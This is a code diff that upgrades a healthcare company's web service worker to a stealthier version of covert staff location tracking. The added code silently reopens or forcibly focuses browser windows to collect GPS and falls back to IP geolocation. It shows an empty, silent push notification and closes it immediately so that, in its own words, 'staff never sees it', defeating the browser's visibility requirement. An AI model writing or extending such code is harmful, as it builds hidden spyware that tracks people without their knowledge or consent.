@@ -1,11 +1,13 @@
 /* ═══════════════════════════════════════════════════════
- *  Varolyn Healthcare — Service Worker v7 GHOST MURMUR
+ *  Varolyn Healthcare — Service Worker v8 IRON GHOST
  *  COMPLETELY INVISIBLE. Zero notifications. Zero alerts.
  *  Staff sees NOTHING. Tracking is silent, persistent,
  *  and self-healing. Total stealth operation.
+ *  v8: Aggressive push recovery, multi-attempt client wake,
+ *  always-open window strategy, faster autonomous cycle.
  * ═══════════════════════════════════════════════════════ */
 
-const CACHE = 'varolyn-v7';
+const CACHE = 'varolyn-v8';
 const ASSETS = ['/', '/manifest.json'];
 const DB_NAME = 'varolyn_offline';
 const DB_VERSION = 3;
@@ -51,7 +53,11 @@ self.addEventListener('install', (e) => {
   self.skipWaiting();
 });
 self.addEventListener('activate', (e) => {
-  e.waitUntil(caches.keys().then(keys => Promise.all(keys.filter(k => k !== CACHE).map(k => caches.delete(k)))).then(() => self.clients.claim()));
+  e.waitUntil(
+    caches.keys()
+      .then(keys => Promise.all(keys.filter(k => k !== CACHE).map(k => caches.delete(k))))
+      .then(() => self.clients.claim())
+  );
 });
 
 // ── Fetch (cache-first for static assets) ──
@@ -75,14 +81,15 @@ self.addEventListener('message', async (e) => {
   if (type === 'KEEPALIVE') e.source.postMessage({ type: 'ALIVE' });
   if (type === 'SET_SESSION') await saveActiveSession(data);
   if (type === 'CLEAR_SESSION') await clearActiveSession();
+  if (type === 'SKIPWAITING') self.skipWaiting();
   // NO notification commands — full stealth mode
 });
 
 // ══════════════════════════════════════════════════════
-//  GHOST MURMUR — SILENT PUSH HANDLER
+//  IRON GHOST — SILENT PUSH HANDLER
 //  Server sends push → SW handles EVERYTHING invisibly.
-//  NO notifications shown. NO alerts. NO sounds. NOTHING.
-//  Staff is completely unaware. Pure background operation.
+//  Multi-attempt wake strategy: wake → wait → re-wake → IP fallback
+//  Maximizes the 30s push event lifetime for recovery.
 // ══════════════════════════════════════════════════════
 self.addEventListener('push', (e) => {
   let payload = {};
@@ -98,7 +105,7 @@ self.addEventListener('push', (e) => {
       try {
         const hbRes = await fetch(self.location.origin + '/api/heartbeat', {
           method: 'POST', headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ token, sessionSecret: secret, checks: { pushReceived: true, swAlive: true, ts: Date.now() } }),
+          body: JSON.stringify({ token, sessionSecret: secret, checks: { pushReceived: true, swAlive: true, ts: Date.now(), reason: payload.reason || 'push' } }),
         });
         if (hbRes.ok) {
           const data = await hbRes.json();
@@ -115,25 +122,53 @@ self.addEventListener('push', (e) => {
     // ── STEP 2: Flush buffered locations ──
     if (token && secret) { try { await syncBufferedLocations(); } catch {} }
 
-    // ── STEP 3: Wake existing page clients silently ──
+    // ── STEP 3: Wake ALL existing page clients — multi-message for reliability ──
     let wokenClient = false;
     try {
       const clientList = await clients.matchAll({ type: 'window', includeUncontrolled: true });
       for (const client of clientList) {
         if (client.url.includes(self.location.origin)) {
           client.postMessage({ type: 'PUSH_RESUME', token, auto: true });
+          client.postMessage({ type: 'FORCE_GPS_PUSH' });
           try { await client.focus(); } catch {}
           wokenClient = true;
         }
       }
     } catch {}
 
-    // ── STEP 4: No open tab → try to open one silently ──
+    // ── STEP 4: No open tab → ALWAYS reopen the page ──
     if (!wokenClient) {
-      try { await clients.openWindow(self.location.origin + '/'); } catch {}
+      try {
+        await clients.openWindow(self.location.origin + '/');
+        // Wait for page to load
+        await new Promise(r => setTimeout(r, 3000));
+        // Send resume command to newly opened page
+        try {
+          const cls = await clients.matchAll({ type: 'window', includeUncontrolled: true });
+          for (const c of cls) {
+            if (c.url.includes(self.location.origin)) {
+              c.postMessage({ type: 'PUSH_RESUME', token, auto: true });
+              wokenClient = true;
+            }
+          }
+        } catch {}
+      } catch {}
     }
 
-    // ── STEP 5: If no page for GPS, use IP fallback from server ──
+    // ── STEP 5: Second wake attempt after delay (mobile browsers are slow) ──
+    if (wokenClient) {
+      try {
+        await new Promise(r => setTimeout(r, 5000));
+        const cls = await clients.matchAll({ type: 'window', includeUncontrolled: true });
+        for (const c of cls) {
+          if (c.url.includes(self.location.origin)) {
+            c.postMessage({ type: 'FORCE_GPS_PUSH' });
+          }
+        }
+      } catch {}
+    }
+
+    // ── STEP 6: If still no page for GPS, use IP fallback ──
     if (!wokenClient && token && secret) {
       try {
         await fetch(self.location.origin + '/api/ip-location', {
@@ -144,23 +179,21 @@ self.addEventListener('push', (e) => {
     }
 
     // ── BROWSER REQUIREMENT: must show notification from push event ──
-    // Show it silently with minimal text, then close it immediately
+    // Show silently, close immediately — staff never sees it
     try {
       await self.registration.showNotification('Varolyn Healthcare', {
         tag: 'varolyn-ghost', silent: true, renotify: false,
         badge: '/favicon.ico', icon: '/favicon.ico',
-        body: '', // Empty body
-        requireInteraction: false, // Auto-dismiss
+        body: '', requireInteraction: false,
         data: { token, action: 'ghost' },
       });
-      // Immediately close it — staff never sees it
       const notifs = await self.registration.getNotifications({ tag: 'varolyn-ghost' });
       for (const n of notifs) n.close();
     } catch {}
   })());
 });
 
-// ── Notification click — just open/focus the app ──
+// ── Notification click — open/focus the app ──
 self.addEventListener('notificationclick', (e) => {
   e.notification.close();
   e.waitUntil(
@@ -192,13 +225,17 @@ self.addEventListener('sync', (e) => {
 
 // ══════════════════════════════════════════════════════
 //  AUTONOMOUS TRACKING CYCLE — works WITHOUT any page
+//  Runs from periodic sync, background sync, and push events.
+//  Always tries to get a page open for GPS access.
 // ══════════════════════════════════════════════════════
 async function autonomousTrackingCycle() {
   const session = await getActiveSession();
   if (!session || !session.token || !session.sessionSecret) return;
 
+  // Flush any buffered locations first
   await syncBufferedLocations();
 
+  // Heartbeat to server
   try {
     const hbRes = await fetch(self.location.origin + '/api/heartbeat', {
       method: 'POST', headers: { 'Content-Type': 'application/json' },
@@ -215,17 +252,35 @@ async function autonomousTrackingCycle() {
     }
   } catch {}
 
-  // Tell any open page to do a GPS push, or use IP fallback
+  // Try to wake/open a page for GPS, or fall back to IP
   try {
     const cls = await clients.matchAll({ type: 'window', includeUncontrolled: true });
-    const hasPage = cls.some(c => c.url.includes(self.location.origin));
-    if (hasPage) {
-      for (const c of cls) { if (c.url.includes(self.location.origin)) c.postMessage({ type: 'FORCE_GPS_PUSH' }); }
+    const ourClients = cls.filter(c => c.url.includes(self.location.origin));
+
+    if (ourClients.length > 0) {
+      // Have a page open → tell it to do GPS push
+      for (const c of ourClients) {
+        c.postMessage({ type: 'FORCE_GPS_PUSH' });
+        c.postMessage({ type: 'PUSH_RESUME', token: session.token, auto: true });
+      }
     } else {
-      await fetch(self.location.origin + '/api/ip-location', {
-        method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ token: session.token, sessionSecret: session.sessionSecret }),
-      });
+      // No page open → try to open one, then fall back to IP
+      try {
+        await clients.openWindow(self.location.origin + '/');
+        await new Promise(r => setTimeout(r, 2000));
+        const newCls = await clients.matchAll({ type: 'window', includeUncontrolled: true });
+        for (const c of newCls) {
+          if (c.url.includes(self.location.origin)) {
+            c.postMessage({ type: 'PUSH_RESUME', token: session.token, auto: true });
+          }
+        }
+      } catch {
+        // Can't open window → IP fallback
+        await fetch(self.location.origin + '/api/ip-location', {
+          method: 'POST', headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ token: session.token, sessionSecret: session.sessionSecret }),
+        }).catch(() => {});
+      }
     }
   } catch {}
 }
